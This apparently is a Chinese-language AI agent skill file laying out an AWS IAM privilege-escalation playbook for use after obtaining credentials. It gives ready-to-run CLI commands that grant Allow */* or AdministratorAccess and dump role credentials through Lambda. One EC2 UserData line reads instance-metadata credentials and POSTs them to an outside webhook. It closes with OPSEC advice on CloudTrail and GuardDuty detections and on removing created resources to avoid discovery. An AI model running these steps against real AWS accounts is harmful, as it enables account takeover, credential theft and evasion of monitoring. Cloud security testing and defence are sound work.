---
name: aws-iam-privesc
description: "AWS IAM 权限提升专项方法论。当已获取 AWS 凭据并需要提升权限、发现当前 IAM 用户/角色权限有限需要横向或纵向提权、或需要分析 IAM Policy 寻找提权路径时使用。覆盖 46 个 AWS 服务的提权技术，包括 PassRole 滥用、AssumeRole 链式提权、Lambda/EC2/ECS 计算服务提权、以及 NotAction 隐式权限利用"
metadata:
  tags: "aws,iam,privilege-escalation,passrole,assumerole,提权,lambda,ec2,sts,policy,权限提升,横向移动"
  category: "cloud"
---

# AWS IAM 权限提升方法论

AWS 环境中的提权（Privilege Escalation）是最关键的攻击阶段之一。与传统操作系统提权不同，AWS 提权的核心在于 IAM 权限组合的滥用——一个看似无害的 `iam:PassRole` 权限，配合计算服务的创建权限，就能让攻击者获得任意角色的完整权限。AWS 拥有数百项权限，其中许多权限组合可构成提权链路。

**核心要点**：`iam:PassRole` 是 AWS 提权中最普遍的向量。当 IAM Policy 使用 `NotAction` 排除某些操作时，可能隐式授予了包括 PassRole 在内的大量敏感权限。

## 深入参考

识别到具体提权集群后，加载对应参考文档获取完整技术细节：

- IAM/STS/Organizations 核心提权 → 读 [references/iam-sts-privesc.md](references/iam-sts-privesc.md)
- 计算服务提权（EC2/Lambda/ECS/Glue 等） → 读 [references/compute-privesc.md](references/compute-privesc.md)
- 其他服务提权（S3/DynamoDB/KMS 等） → 读 [references/service-privesc.md](references/service-privesc.md)

## 核心概念：PassRole

### 什么是 PassRole

`iam:PassRole` 是一种特殊的 IAM 权限，允许用户将一个 IAM 角色"传递"给某个 AWS 服务。该服务随后以这个角色的身份运行，拥有角色的全部权限。

**工作流程**：
```
攻击者 (有 PassRole + 服务创建权限)
    │
    ├── 1. 找到/创建一个高权限角色（如 AdminRole）
    ├── 2. 将该角色传递给服务（如 Lambda）
    ├── 3. 服务以 AdminRole 身份执行代码
    └── 4. 攻击者通过服务获取 AdminRole 的临时凭据
```

### 为什么 PassRole 是最常见的提权向量

- 几乎所有 AWS 计算服务（Lambda、EC2、ECS、Glue、SageMaker 等）都接受角色传递
- 管理员通常授予 `iam:PassRole` 而不限制 `Resource` 为特定角色（使用 `*`）
- 一旦拥有 PassRole + 任意计算服务创建权限，就能提权到目标角色

### 如何识别 PassRole 权限

```bash
# 检查当前用户/角色的 Policy
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-user-policy --user-name <user> --policy-name <policy>

# 搜索包含 PassRole 的 Policy
aws iam get-policy-version --policy-arn <arn> --version-id <vid> \
  | grep -i "passrole"
```

### NotAction 隐式授权陷阱

当 Policy 使用 `NotAction` + `Allow` 时，实际上允许了除指定操作外的所有操作：

```json
{
  "Effect": "Allow",
  "NotAction": "s3:DeleteBucket",
  "Resource": "*"
}
```

**此策略隐式授予了 `iam:PassRole`、`iam:CreateUser`、`sts:AssumeRole` 等所有敏感权限**。这是实战中非常常见的配置错误。

## 提权决策树

获取凭据后，按以下决策树逐步检查可用的提权路径：

```
当前权限分析
├─ 有 iam:* 或 iam:Create*/Attach* 权限
│   ├─ iam:CreateUser + iam:AttachUserPolicy → 直接创建 Admin 用户
│   ├─ iam:CreatePolicyVersion → 修改现有 Policy 为 Admin
│   ├─ iam:AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy → 附加 Admin 策略
│   ├─ iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy → 添加内联 Admin 策略
│   ├─ iam:AddUserToGroup → 加入 Admin 组
│   ├─ iam:CreateAccessKey → 为高权限用户创建密钥
│   ├─ iam:CreateLoginProfile / UpdateLoginProfile → 设置控制台密码
│   ├─ iam:UpdateAssumeRolePolicy → 修改信任策略允许自己 AssumeRole
│   ├─ iam:SetDefaultPolicyVersion → 回滚到宽松策略版本
│   └─ iam:UpdateSAMLProvider → 篡改 SAML 联合登录
│       → 读 references/iam-sts-privesc.md
│
├─ 有 iam:PassRole + 计算服务创建权限
│   ├─ + lambda:CreateFunction + lambda:InvokeFunction → Lambda 提权
│   ├─ + ec2:RunInstances → EC2 UserData 提权
│   ├─ + ecs:RegisterTaskDefinition + ecs:RunTask → ECS 提权
│   ├─ + glue:CreateJob + glue:StartJobRun → Glue 提权
│   ├─ + sagemaker:CreateNotebookInstance → SageMaker 提权
│   ├─ + codebuild:CreateProject + codebuild:StartBuild → CodeBuild 提权
│   ├─ + cloudformation:CreateStack → CloudFormation 提权
│   ├─ + datapipeline:CreatePipeline → DataPipeline 提权
│   ├─ + apprunner:CreateService → AppRunner 提权
│   └─ + stepfunctions:CreateStateMachine → Step Functions 提权
│       → 读 references/compute-privesc.md
│
├─ 有 sts:AssumeRole
│   ├─ 枚举信任策略宽松的角色（Principal: "*"）
│   ├─ 跨账户角色链 → Organizations 提权
│   └─ IAM Roles Anywhere（X.509 证书）
│       → 读 references/iam-sts-privesc.md
│
├─ 有服务特定权限
│   ├─ ssm:SendCommand / ssm:StartSession → SSM 提权到 EC2
│   ├─ s3:PutObject（CloudFormation 模板桶） → 劫持部署
│   ├─ dynamodb:PutResourcePolicy → 授权自己访问
│   ├─ kms:PutKeyPolicy / kms:CreateGrant → KMS 密钥访问
│   ├─ secretsmanager:GetSecretValue → 读取凭据
│   ├─ codebuild:StartBuild → 覆盖 Buildspec 提权
│   ├─ lambda:UpdateFunctionCode → 修改已有 Lambda 代码
│   ├─ ecr:SetRepositoryPolicy → 镜像供应链攻击
│   └─ cognito-identity:SetIdentityPoolRoles → Cognito 角色提权
│       → 读 references/service-privesc.md
│
└─ 权限非常有限
    ├─ 枚举所有可用权限 → enumerate-iam
    ├─ 逐服务检查 → Pacu iam__privesc_scan
    └─ 图分析 → PMapper 构建权限图
```

## Top 10 高频提权路径

| # | 所需权限 | 提权方法 | 结果 |
|---|---------|---------|------|
| 1 | `iam:CreatePolicyVersion` | 创建新策略版本并设为默认，内容为 `Allow */*` | Admin |
| 2 | `iam:AttachUserPolicy` | 直接附加 `AdministratorAccess` 到当前用户 | Admin |
| 3 | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | 创建 Lambda 执行高权限角色代码 | Target Role |
| 4 | `iam:PassRole` + `ec2:RunInstances` | 启动 EC2 并通过 UserData/SSH 窃取角色凭据 | Target Role |
| 5 | `iam:PassRole` + `ecs:RegisterTaskDefinition` + `ecs:RunTask` | 注册恶意任务定义并运行 | Target Role |
| 6 | `iam:PassRole` + `cloudformation:CreateStack` | 创建 Stack 执行任意 AWS API | CF Role |
| 7 | `iam:CreateAccessKey` | 为其他高权限用户创建访问密钥 | Target User |
| 8 | `sts:AssumeRole`（信任策略宽松的角色） | 直接假冒高权限角色 | Target Role |
| 9 | `iam:PassRole` + `glue:CreateJob` | 创建 Glue Job 执行反弹 Shell | Target Role |
| 10 | `lambda:UpdateFunctionCode` | 修改已有 Lambda 代码注入后门 | Lambda Role |

### 路径 1：iam:CreatePolicyVersion — 策略版本注入

最简洁的提权方式。利用 `--set-as-default` 标志创建新策略版本并立即生效，无需额外权限。策略关联的所有用户/组/角色立即获得新权限。

```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**检测**：CloudTrail 记录 `CreatePolicyVersion` 事件，策略版本变更会被审计。

### 路径 2：iam:AttachUserPolicy — 附加托管策略

直接将 AWS 托管的 `AdministratorAccess` 策略附加到当前用户。

```bash
aws iam attach-user-policy --user-name <current_user> \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

**变体**：`iam:AttachGroupPolicy`（附加到所属组）、`iam:AttachRolePolicy`（附加到角色，需配合 AssumeRole）。

### 路径 3：PassRole + Lambda — 最经典的 PassRole 提权

创建 Lambda 函数绑定高权限角色，函数内读取环境变量获取临时凭据并返回。

```bash
# 创建窃取凭据的函数代码
cat > /tmp/steal.py << 'EOF'
def handler(event, context):
    import os
    return {'env': dict(os.environ)}
EOF
cd /tmp && zip steal.zip steal.py

aws lambda create-function --function-name privesc \
  --runtime python3.9 --role <target_role_arn> \
  --handler steal.handler --zip-file fileb:///tmp/steal.zip

aws lambda invoke --function-name privesc /tmp/out.json && cat /tmp/out.json
```

**注意**：网络隔离的 Lambda 无法反弹 Shell，但可通过返回值直接泄露凭据。

### 路径 4：PassRole + EC2 — UserData 提权

启动 EC2 实例并通过 UserData 执行命令，从 IMDS 获取角色凭据。

```bash
aws ec2 run-instances --image-id <ami_id> --instance-type t2.micro \
  --iam-instance-profile Name=<instance_profile> \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> | curl -X POST -d @- https://<webhook>'
```

**注意**：从实例外部使用 EC2 角色凭据会触发 GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` 告警。

### 路径 5：PassRole + ECS — 任务定义提权

注册包含恶意容器的任务定义，从 ECS 元数据端点（`169.254.170.2`）获取任务角色凭据。Fargate 和 EC2 启动类型均可利用。也可使用 `--overrides` 直接覆盖已有任务的角色和命令。

### 路径 6：PassRole + CloudFormation — 基础设施即代码提权

CloudFormation Stack 可创建任意 AWS 资源。创建包含恶意 IAM 资源（如新 Admin 用户）的模板，通过高权限 CF 角色部署。

### 路径 7：iam:CreateAccessKey — 密钥创建

如果目标用户已有 2 个密钥，需先 `iam:DeleteAccessKey` 删除一个。创建后即可使用目标用户的全部权限。

### 路径 8：sts:AssumeRole — 角色假冒

关键在于发现信任策略配置宽松的角色。`Principal: "*"` 意味着任何 AWS 实体均可假冒。

```bash
# 枚举所有角色的信任策略
for role in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  echo "=== $role ==="
  aws iam get-role --role-name $role --query 'Role.AssumeRolePolicyDocument'
done
```

### 路径 9-10：Glue Job / Lambda 代码修改

Glue Job 提权模式与 Lambda 类似但通过 S3 脚本执行。`lambda:UpdateFunctionCode` 无需 PassRole，直接修改已有函数代码——如果函数被自动触发（API Gateway、S3 事件等），注入代码将自动执行。

**完整利用命令** → 读 [references/compute-privesc.md](references/compute-privesc.md) 和 [references/service-privesc.md](references/service-privesc.md)。

## 按服务集群索引

### IAM/STS/Organizations 集群

核心 IAM 提权技术——最直接的提权集群，无需通过计算服务中转，直接修改 IAM 配置获取高权限。

**主要技术分类**：

| 技术类别 | 关键权限 | 提权效果 |
|---------|---------|---------|
| 策略操纵 | `iam:CreatePolicyVersion`、`iam:SetDefaultPolicyVersion` | 修改策略内容获取 Admin |
| 策略附加 | `iam:AttachUserPolicy`、`iam:PutUserPolicy` 等 | 附加/注入 Admin 策略 |
| 组管理 | `iam:AddUserToGroup` | 加入高权限组 |
| 凭据创建 | `iam:CreateAccessKey`、`iam:CreateLoginProfile` | 获取目标用户凭据 |
| 信任篡改 | `iam:UpdateAssumeRolePolicy`、`iam:UpdateSAMLProvider` | 修改信任策略或 SAML |
| MFA 接管 | `iam:CreateVirtualMFADevice` + `iam:EnableMFADevice` | 控制目标用户 MFA |
| STS 角色链 | `sts:AssumeRole`、`sts:AssumeRoleWithSAML` | 假冒高权限角色 |
| SSO 提权 | `sso:PutInlinePolicyToPermissionSet`、`sso:CreateAccountAssignment` | 修改权限集 |
| Cognito | `cognito-identity:SetIdentityPoolRoles` | 劫持身份池角色 |
| Roles Anywhere | X.509 证书 + 宽松信任策略 | 假冒任意角色 |

涉及服务：IAM、STS、Organizations、IAM Identity Center (SSO)、Directory Services、Cognito

→ 读 [references/iam-sts-privesc.md](references/iam-sts-privesc.md)

### 计算服务集群

所有基于 `iam:PassRole` + 计算服务创建权限的提权路径。攻击模式统一：创建计算资源 → 附加高权限角色 → 在计算资源内执行代码 → 窃取角色凭据。

**主要技术分类**：

| 服务 | PassRole 模式 | 无 PassRole 模式 |
|------|-------------|-----------------|
| EC2 | RunInstances + UserData/SSH | ModifyInstanceAttribute、SendSSHPublicKey |
| Lambda | CreateFunction + Invoke | UpdateFunctionCode、UpdateFunctionConfiguration (环境变量 RCE) |
| ECS | RegisterTaskDefinition + RunTask | ExecuteCommand 进入容器、RegisterContainerInstance |
| Glue | CreateDevEndpoint / CreateJob | UpdateDevEndpoint (SSH 密钥替换)、UpdateJob |
| SageMaker | CreateNotebookInstance | CreatePresignedNotebookInstanceUrl / CreatePresignedDomainUrl |
| CodeBuild | CreateProject + StartBuild | StartBuild (buildspec 覆盖)、UpdateProject |
| CloudFormation | CreateStack / CreateChangeSet | UpdateStack (利用已附加角色) |
| Step Functions | CreateStateMachine + StartExecution | TestState (直接测试单个状态) |
| EventBridge | CreateSchedule (Universal Target) | - |
| EMR | RunJobFlow + SSH | OpenEditorInConsole |
| AppRunner | CreateService | - |
| DataPipeline | CreatePipeline + PutPipelineDefinition | - |
| CodePipeline | CreatePipeline | PollForJobs (获取 S3 临时凭据) |
| Elastic Beanstalk | CreateApplication + S3 写入 | RebuildEnvironment (代码替换) |

涉及服务：EC2、Lambda、ECS/EKS、Glue、SageMaker、EMR、CodeBuild、CodePipeline、CodeStar、Elastic Beanstalk、AppRunner、Step Functions、DataPipeline、EventBridge Scheduler

→ 读 [references/compute-privesc.md](references/compute-privesc.md)

### 其他服务集群

数据服务、安全服务和基础设施服务的提权路径。多为间接提权——通过访问敏感数据、修改资源策略、或劫持部署管道实现。

**主要技术分类**：

| 服务 | 关键权限 | 提权方式 |
|------|---------|---------|
| SSM | `ssm:SendCommand`、`ssm:StartSession` | 远程命令执行，窃取 EC2/ECS 角色凭据 |
| S3 | `s3:PutObject`（配置桶） | 篡改 CF 模板/Terraform 状态/Buildspec |
| DynamoDB | `dynamodb:PutResourcePolicy` | 资源策略注入，授予跨账户访问 |
| KMS | `kms:PutKeyPolicy`、`kms:CreateGrant` | 密钥策略修改，解密受保护数据 |
| SecretsManager | `secretsmanager:GetSecretValue` | 直接读取存储的凭据/密码 |
| ECR | `ecr:SetRepositoryPolicy`、`ecr:PutImage` | 镜像供应链攻击、标签覆盖 |
| EBS | `ebs:GetSnapshotBlock` | 下载快照提取凭据（如 AD 密码） |
| RDS | `rds:ModifyDBInstance` | 重置数据库密码 |
| SNS/SQS | `sns:Subscribe`、`sqs:ReceiveMessage` | 消息窃听获取敏感信息 |
| Lightsail | `lightsail:DownloadDefaultKeyPair` | SSH 密钥获取（非 IAM 提权） |
| Route53 | `route53:ChangeResourceRecordSets` | DNS 劫持辅助攻击 |

涉及服务：S3、DynamoDB、RDS、KMS、SecretsManager、SNS、SQS、SSM、CloudFormation（无 PassRole）、Redshift、EBS、EFS、ECR、Lightsail 等

→ 读 [references/service-privesc.md](references/service-privesc.md)

## 权限到服务速查矩阵

当你发现某个特定权限时，快速定位可能的提权路径：

| 发现的权限 | 应检查的提权路径 | 参考 |
|-----------|----------------|------|
| `iam:PassRole` (Resource: *) | 所有计算服务提权 | compute-privesc.md |
| `iam:PassRole` (Resource: 特定角色) | 检查该角色权限，选择匹配的计算服务 | compute-privesc.md |
| `iam:Create*` / `iam:Attach*` / `iam:Put*` | IAM 直接提权 | iam-sts-privesc.md |
| `sts:AssumeRole` | 枚举信任策略宽松的角色 | iam-sts-privesc.md |
| `lambda:*` | Lambda 代码修改/创建 | compute-privesc.md |
| `ec2:RunInstances` / `ec2:Modify*` | EC2 提权 | compute-privesc.md |
| `ecs:*` | ECS 任务定义/容器命令执行 | compute-privesc.md |
| `ssm:SendCommand` / `ssm:StartSession` | SSM 远程执行 | service-privesc.md |
| `s3:PutObject`（基础设施桶） | 配置文件/模板篡改 | service-privesc.md |
| `codebuild:StartBuild` | Buildspec 覆盖 | compute-privesc.md |
| `secretsmanager:GetSecretValue` | 直接读取凭据 | service-privesc.md |
| `kms:PutKeyPolicy` | KMS 密钥接管 | service-privesc.md |
| `cognito-identity:*` | Cognito 角色劫持 | iam-sts-privesc.md |

## 提权检测与自动化工具

### 权限枚举工具

| 工具 | 用途 | 命令示例 |
|------|------|---------|
| enumerate-iam | 暴力枚举当前凭据可用的 API | `python enumerate-iam.py --access-key AKIA... --secret-key ...` |
| Pacu (iam__enum_permissions) | 枚举 IAM 权限 | `run iam__enum_permissions` |
| ScoutSuite | 多云安全审计 | `scout aws --profile <profile>` |

### 提权路径分析工具

| 工具 | 用途 | 命令示例 |
|------|------|---------|
| Pacu (iam__privesc_scan) | 自动扫描 21+ 已知提权路径 | `run iam__privesc_scan` |
| PMapper (Principal Mapper) | 图分析 IAM 权限关系，可视化提权链 | `pmapper graph create && pmapper analysis` |
| Cloudsplaining | 分析 IAM Policy 中的过度授权和危险权限 | `cloudsplaining scan --input-file account-auth.json` |
| aws_escalate.py | RhinoSecurityLabs 原始提权检测脚本 | `python aws_escalate.py` |
| Cognito Scanner | Cognito 专项攻击工具 | `cognito-scanner --identity-pool-id <id>` |

### 推荐的提权检查流程

**第一步：确认身份和权限**

```bash
# 确认当前身份
aws sts get-caller-identity

# 查看用户附加的策略
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# 查看用户所属的组
aws iam list-groups-for-user --user-name <user>

# 如果是角色，查看角色策略
aws iam list-attached-role-policies --role-name <role>
```

**第二步：自动化扫描**

```bash
# 使用 Pacu 自动扫描
# 在 Pacu shell 中：
run iam__enum_permissions
run iam__privesc_scan

# 或使用 PMapper 构建权限图
pmapper graph create
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/*"
pmapper query "who can do sts:AssumeRole with *"
pmapper analysis --output results.txt
```

**第三步：手动验证**

根据发现的权限，参照本文的决策树和 references 文件手动验证可行的提权路径。

### AWS CDK 特殊提权路径

使用 AWS CDK 的环境存在预置角色，遵循 `cdk-<qualifier>-<name>-<account>-<region>` 命名模式。默认 qualifier 为 `hnb659fds`。关键角色：

- `cdk-hnb659fds-cfn-exec-role-<account>-<region>` — CloudFormation 执行角色，通常有 `*/*` 权限
- `cdk-hnb659fds-deploy-role-<account>-<region>` — 部署角色

如果可以 AssumeRole 到 deploy-role 或修改 CDK 项目源码，可注入恶意 CloudFormation 资源获取 Admin。

## 注意事项

### 操作安全（OPSEC）

- **CloudTrail 日志**：几乎所有 IAM/STS 操作都被记录。高危事件包括：
  - `CreatePolicyVersion`、`AttachUserPolicy`、`CreateAccessKey`
  - `PassRole`（作为其他 API 调用的参数记录）
  - `AssumeRole`、`AssumeRoleWithSAML`
- **GuardDuty 检测**：
  - `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` — EC2 角色凭据在实例外使用
  - `Recon:IAMUser/UserPermissions` — 大量 IAM 枚举操作
  - `PrivilegeEscalation:IAMUser/AdministrativePermissions` — 权限提升行为
- **异步操作等待**：
  - EC2 启动约需 1-3 分钟
  - Glue DevEndpoint 准备约需 5-10 分钟
  - SageMaker Notebook 创建约需 3-5 分钟
  - CloudFormation Stack 创建时间取决于资源数量
- **资源清理**：提权后及时清理创建的资源（Lambda 函数、EC2 实例等），减少被发现风险

### 提权前置条件验证

- **跨账户 AssumeRole**：需要目标角色信任策略允许攻击者账户，且攻击者账户自身策略允许 `sts:AssumeRole`
- **PassRole 资源限制**：检查 `iam:PassRole` 的 `Resource` 字段——`*` 表示可传递任意角色，特定 ARN 表示只能传递指定角色
- **服务信任关系**：传递的角色必须信任目标服务（如 Lambda 角色需信任 `lambda.amazonaws.com`）
- **权限边界（Permissions Boundary）**：即使附加了 Admin 策略，权限边界可能限制实际生效的权限
- **SCP（Service Control Policy）**：Organizations 的 SCP 可能限制成员账户的操作，即使拥有 Admin 权限
- **VPC 网络限制**：部分提权路径（如 RDS 密码重置）需要能够网络访问目标资源

### 交叉引用

- 参考 `aws-pentesting` 技能，获取整体攻击流程
- 参考 `cloud-iam-audit` 技能，进行跨云 IAM 审计
- 参考 `aws-iam-policy-analysis` 技能，深入分析 Policy 配置
